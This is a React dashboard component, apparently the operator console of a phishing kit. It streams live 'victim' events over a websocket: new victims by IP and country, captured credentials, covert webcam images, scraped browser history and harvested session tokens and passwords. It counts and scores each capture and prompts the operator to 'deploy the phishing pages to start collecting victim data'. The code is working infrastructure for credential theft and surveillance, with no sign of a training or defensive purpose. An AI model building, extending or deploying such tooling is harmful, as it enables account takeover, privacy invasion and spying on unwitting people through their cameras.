import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Box, Typography, Card, CardContent, Chip, IconButton, Switch, FormControlLabel, Tooltip, Badge, Select, MenuItem, FormControl, InputLabel, Button } from '@mui/material';
import { io } from 'socket.io-client';
import axios from 'axios';
import ClearAllIcon from '@mui/icons-material/ClearAll';
import FilterListIcon from '@mui/icons-material/FilterList';
import FiberManualRecordIcon from '@mui/icons-material/FiberManualRecord';
import VolumeUpIcon from '@mui/icons-material/VolumeUp';
import DownloadIcon from '@mui/icons-material/Download';

const EVENT_COLORS = {
  'new-victim': '#00f0ff',
  'victim-click': '#aaa',
  'credential-captured': '#ff0055',
  'camera-capture': '#ffaa00',
  'victim-offline': '#555',
  'camera-access': '#00ff88',
  'alert-triggered': '#ff3355',
  'browser-history': '#aa66ff',
  'session-harvest': '#ff8800',
  'system': '#888'
};

const EVENT_LABELS = {
  'new-victim': '🆕 New Victim',
  'victim-click': '👆 Click',
  'credential-captured': '🔑 Credential',
  'camera-capture': '📷 Camera',
  'victim-offline': '⚫ Offline',
  'camera-access': '📸 Camera Access',
  'alert-triggered': '🚨 Alert',
  'browser-history': '📜 History',
  'session-harvest': '📦 Sessions',
  'system': '⚙️ System'
};

const SOCKET_URL = process.env.REACT_APP_API_URL || '';
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

export default function LiveFeed() {
  const [events, setEvents] = useState([]);
  const [autoScroll, setAutoScroll] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [connected, setConnected] = useState(false);
  const [filterType, setFilterType] = useState('all');
  const [stats, setStats] = useState({ today: 0, credentials: 0, cameras: 0 });
  const feedRef = useRef(null);
  const topRef = useRef(null);
  const socketRef = useRef(null);

  // Play notification beep
  const playBeep = useCallback(() => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.frequency.value = 880;
      osc.type = 'sine';
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
      osc.start(audioCtx.currentTime);
      osc.stop(audioCtx.currentTime + 0.3);
    } catch (e) {
      // Audio not supported
    }
  }, []);

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) return;

    // Connect socket - use relative path if API_URL is same origin, else use API_URL
    const socketUrl = SOCKET_URL || undefined;
    const socket = io(socketUrl, {
      auth: { token },
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 10,
      reconnectionDelay: 2000
    });
    socketRef.current = socket;

    socket.on('connect', () => {
      setConnected(true);
      socket.emit('join-admin', token);
      addEvent({ type: 'system', message: '🟢 Connected to live feed', time: new Date() });
    });

    socket.on('disconnect', () => {
      setConnected(false);
      addEvent({ type: 'system', message: '🔴 Disconnected from server. Reconnecting...', time: new Date() });
    });

    socket.on('connect_error', (err) => {
      setConnected(false);
      console.warn('Socket connection error:', err.message);
    });

    socket.on('new-victim', (data) => {
      addEvent({
        ...data, type: 'new-victim',
        message: `New victim from ${data.ipAddress || 'unknown IP'} ${data.country ? '(' + data.country + ')' : ''}`,
        detail: `${data.browser || '?'} • ${data.os || '?'}`,
        time: new Date()
      });
      setStats(prev => ({ ...prev, today: prev.today + 1 }));
      if (soundEnabled) playBeep();
    });

    socket.on('victim-click', (data) => {
      addEvent({
        ...data, type: 'victim-click',
        message: `Click on "${data.targetElement?.tag || 'element'}" at (${data.x}, ${data.y})`,
        detail: data.pageUrl || '',
        time: new Date()
      });
    });

    socket.on('credential-captured', (data) => {
      addEvent({
        ...data, type: 'credential-captured',
        message: `🔑 Credentials captured from ${data.email || data.username || 'unknown user'}`,
        detail: `URL: ${data.url || 'N/A'} | Strength: ${data.strength || '?'} | Score: +10`,
        time: new Date()
      });
      setStats(prev => ({ ...prev, credentials: prev.credentials + 1 }));
      if (soundEnabled) playBeep();
    });

    socket.on('camera-capture', (data) => {
      addEvent({
        ...data, type: 'camera-capture',
        message: `📷 Camera image captured from session`,
        detail: `Trigger: ${data.triggerType || 'auto'} | Score: +25`,
        time: new Date()
      });
      setStats(prev => ({ ...prev, cameras: prev.cameras + 1 }));
      if (soundEnabled) playBeep();
    });

    socket.on('camera-access', (data) => {
      addEvent({
        ...data, type: 'camera-access',
        message: `Camera access ${data.granted ? '✅ GRANTED' : '❌ DENIED'}`,
        time: new Date()
      });
      if (data.granted && soundEnabled) playBeep();
    });

    socket.on('victim-offline', (data) => {
      addEvent({
        ...data, type: 'victim-offline',
        message: `Victim went offline: ${data.sessionIdStr?.substring(0, 16) || 'unknown'}...`,
        detail: `Time on site: ${Math.floor((data.timeOnSite || 0) / 60)}m | Clicks: ${data.clickCount || 0}`,
        time: new Date()
      });
    });

    socket.on('browser-history', (data) => {
      addEvent({
        ...data, type: 'browser-history',
        message: `📜 Browser history scraped — ${data.itemCount} items`,
        detail: `Total: ${data.totalItems} | Techniques: ${(data.techniques || []).join(', ')} | Session: ${data.sessionIdStr?.substring(0, 16)}...`,
        time: new Date()
      });
    });

    socket.on('session-harvest', (data) => {
      const sensitiveHint = data.sensitiveItems > 0 ? ` 🔴 ${data.sensitiveItems} sensitive` : '';
      addEvent({
        ...data, type: 'session-harvest',
        message: `📦 Session harvest — ${data.itemCount} items${sensitiveHint}`,
        detail: `Sources: ${(data.sources || []).join(', ')}${data.hasTokens ? ' 🪙 Has tokens' : ''}${data.hasCredentials ? ' 🔑 Has passwords' : ''}`,
        time: new Date()
      });
    });

    return () => {
      socket.disconnect();
      socketRef.current = null;
    };
  }, []); // No dependency on soundEnabled - socket doesn't need to reconnect

  // Play sound when soundEnabled changes or new credential events come
  const addEvent = useCallback((event) => {
    setEvents(prev => {
      const newEvents = [event, ...prev];
      return newEvents.slice(0, 500); // Keep max 500 events
    });
  }, []);

  // Auto scroll
  useEffect(() => {
    if (autoScroll && topRef.current) {
      topRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [events, autoScroll]);

  const clearEvents = () => {
    setEvents([]);
    setStats({ today: 0, credentials: 0, cameras: 0 });
    addEvent({ type: 'system', message: '🗑️ Feed cleared', time: new Date() });
  };

  const exportEvents = () => {
    const dataStr = JSON.stringify(events, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `live-feed-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const filteredEvents = filterType === 'all'
    ? events
    : events.filter(e => e.type === filterType);

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>
              Live Feed
            </Typography>
            <Chip
              icon={<FiberManualRecordIcon sx={{ fontSize: 10, color: connected ? '#00ff88' : '#ff0055' }} />}
              label={connected ? 'Connected' : 'Disconnected'}
              size="small"
              sx={{
                color: connected ? '#00ff88' : '#ff0055',
                bgcolor: connected ? 'rgba(0,255,136,0.1)' : 'rgba(255,0,85,0.1)',
                fontWeight: 600,
                height: 24
              }}
            />
          </Box>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>
            Real-time victim activity · {events.length} events in session
          </Typography>
        </Box>

        <Box sx={{ display: 'flex', gap: 1, alignItems: 'center', flexWrap: 'wrap' }}>
          {/* Stats chips */}
          <Chip label={`📊 ${stats.today} today`} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontWeight: 600 }} />
          <Chip label={`🔑 ${stats.credentials}`} size="small" sx={{ bgcolor: 'rgba(255,0,85,0.1)', color: '#ff0055', fontWeight: 600 }} />
          <Chip label={`📷 ${stats.cameras}`} size="small" sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00', fontWeight: 600 }} />

          <Tooltip title={soundEnabled ? 'Mute' : 'Unmute'}>
            <IconButton size="small" onClick={() => setSoundEnabled(!soundEnabled)}
              sx={{ color: soundEnabled ? '#00ff88' : '#555' }}>
              <VolumeUpIcon sx={{ fontSize: 20 }} />
            </IconButton>
          </Tooltip>

          <Tooltip title="Export events">
            <IconButton size="small" onClick={exportEvents} sx={{ color: '#888', '&:hover': { color: '#00f0ff' } }}>
              <DownloadIcon sx={{ fontSize: 20 }} />
            </IconButton>
          </Tooltip>

          <Tooltip title="Clear feed">
            <IconButton size="small" onClick={clearEvents} sx={{ color: '#888', '&:hover': { color: '#ff0055' } }}>
              <ClearAllIcon sx={{ fontSize: 20 }} />
            </IconButton>
          </Tooltip>

          <FormControlLabel
            control={<Switch checked={autoScroll} onChange={(e) => setAutoScroll(e.target.checked)}
              sx={{ '& .MuiSwitch-thumb': { bgcolor: autoScroll ? '#00f0ff' : '#555' } }} />}
            label="Auto-scroll"
            sx={{ color: '#888', '& .MuiFormControlLabel-label': { fontSize: '0.8rem' } }}
          />
        </Box>
      </Box>

      {/* Event type filter */}
      <Box sx={{ display: 'flex', gap: 1, mb: 2, flexWrap: 'wrap' }}>
        <Chip
          label="All Events"
          size="small"
          onClick={() => setFilterType('all')}
          variant={filterType === 'all' ? 'filled' : 'outlined'}
          sx={{
            bgcolor: filterType === 'all' ? 'rgba(0,240,255,0.15)' : 'transparent',
            color: filterType === 'all' ? '#00f0ff' : '#888',
            borderColor: filterType === 'all' ? 'rgba(0,240,255,0.3)' : 'rgba(255,255,255,0.1)',
            fontWeight: 600,
            cursor: 'pointer'
          }}
        />
        {Object.entries(EVENT_LABELS).filter(([k]) => k !== 'system').map(([key, label]) => (
          <Chip
            key={key}
            label={label}
            size="small"
            onClick={() => setFilterType(key)}
            variant={filterType === key ? 'filled' : 'outlined'}
            sx={{
              bgcolor: filterType === key ? `${EVENT_COLORS[key]}20` : 'transparent',
              color: filterType === key ? EVENT_COLORS[key] : '#888',
              borderColor: filterType === key ? `${EVENT_COLORS[key]}40` : 'rgba(255,255,255,0.1)',
              fontWeight: 600,
              cursor: 'pointer'
            }}
          />
        ))}
        {filterType !== 'all' && (
          <Chip label="Clear Filter" size="small" onClick={() => setFilterType('all')}
            sx={{ color: '#ff0055', cursor: 'pointer', borderColor: '#ff0055' }} variant="outlined" />
        )}
      </Box>

      {/* Live Feed Card */}
      <Card sx={{
        bgcolor: '#0d1117',
        border: `1px solid ${connected ? 'rgba(0,255,136,0.15)' : 'rgba(255,0,85,0.15)'}`,
        maxHeight: '65vh',
        overflow: 'auto',
        borderRadius: 2,
        transition: 'border-color 0.3s'
      }}>
        <CardContent sx={{ p: 1 }}>
          <div ref={topRef} />
          {filteredEvents.length === 0 ? (
            <Box sx={{ textAlign: 'center', py: 6 }}>
              <Typography sx={{ fontSize: '3rem', mb: 1, opacity: 0.3 }}>📡</Typography>
              <Typography sx={{ color: '#666' }}>
                {connected ? 'Waiting for events...' : 'Connecting to server...'}
              </Typography>
              <Typography sx={{ color: '#555', fontSize: '0.8rem', mt: 0.5 }}>
                Deploy the phishing pages to start collecting victim data
              </Typography>
            </Box>
          ) : (
            filteredEvents.map((event, i) => (
              <Box
                key={`${event.type}-${event.time?.getTime?.() || i}-${i}`}
                sx={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: 1.5,
                  py: 1,
                  px: 1.5,
                  borderBottom: '1px solid rgba(255,255,255,0.03)',
                  '&:hover': { bgcolor: 'rgba(255,255,255,0.02)' },
                  animation: i === 0 ? 'fadeIn 0.3s ease' : 'none'
                }}
              >
                {/* Status dot */}
                <Box sx={{ mt: 0.5, minWidth: 10 }}>
                  <Box sx={{
                    width: 10,
                    height: 10,
                    borderRadius: '50%',
                    bgcolor: EVENT_COLORS[event.type] || '#888',
                    boxShadow: `0 0 6px ${EVENT_COLORS[event.type] || '#888'}60`
                  }} />
                </Box>

                {/* Event content */}
                <Box sx={{ flex: 1, minWidth: 0 }}>
                  <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 0.2 }}>
                    <Chip
                      label={EVENT_LABELS[event.type] || event.type}
                      size="small"
                      sx={{
                        bgcolor: `${EVENT_COLORS[event.type] || '#888'}15`,
                        color: EVENT_COLORS[event.type] || '#888',
                        fontSize: '0.65rem',
                        height: 20,
                        fontWeight: 600,
                        letterSpacing: '0.02em'
                      }}
                    />
                    <Typography sx={{ color: '#555', fontSize: '0.7rem', fontFamily: 'monospace' }}>
                      {event.time instanceof Date
                        ? event.time.toLocaleTimeString()
                        : new Date(event.time).toLocaleTimeString()}
                    </Typography>
                  </Box>

                  <Typography sx={{ color: '#ddd', fontSize: '0.88rem', mt: 0.2, fontWeight: 500 }}>
                    {event.message}
                  </Typography>

                  {event.detail && (
                    <Typography sx={{ color: '#777', fontSize: '0.75rem', mt: 0.2, fontFamily: 'monospace' }}>
                      {event.detail}
                    </Typography>
                  )}

                  {event.type === 'credential-captured' && (
                    <Box sx={{ display: 'flex', gap: 0.5, mt: 0.3 }}>
                      <Chip label="🔑 Credential" size="small" sx={{ bgcolor: 'rgba(255,0,85,0.1)', color: '#ff0055', fontSize: '0.65rem', height: 18 }} />
                      <Chip label="+10 score" size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontSize: '0.65rem', height: 18 }} />
                    </Box>
                  )}

                  {event.type === 'camera-capture' && (
                    <Box sx={{ display: 'flex', gap: 0.5, mt: 0.3 }}>
                      <Chip label="📷 New image" size="small" sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00', fontSize: '0.65rem', height: 18 }} />
                      <Chip label="+25 score" size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontSize: '0.65rem', height: 18 }} />
                    </Box>
                  )}
                </Box>
              </Box>
            ))
          )}
        </CardContent>
      </Card>
    </Box>
  );
}